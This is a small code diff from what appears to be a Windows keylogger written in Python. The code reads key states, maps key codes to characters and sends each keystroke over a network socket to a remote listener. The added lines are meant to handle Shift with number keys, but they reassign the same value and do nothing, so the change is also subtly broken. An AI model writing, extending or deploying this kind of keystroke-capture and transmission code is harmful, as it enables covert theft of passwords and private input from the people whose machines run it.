@@ -84,6 +84,8 @@ def main():
                     key = asciiTable.get(i, "")
                     if user.GetKeyState(0x14) & 0x0001 == 0 and i in range(65, 91):
                         key = key.lower()
+                    if user.GetKeyState(0x10) & 0x8000 and i in range(48, 58):  # Check if Shift key is pressed with a number
+                        key = asciiTable.get(i, "")    
                     if key:
                         try:
                             clientsocket.sendall(key.encode())
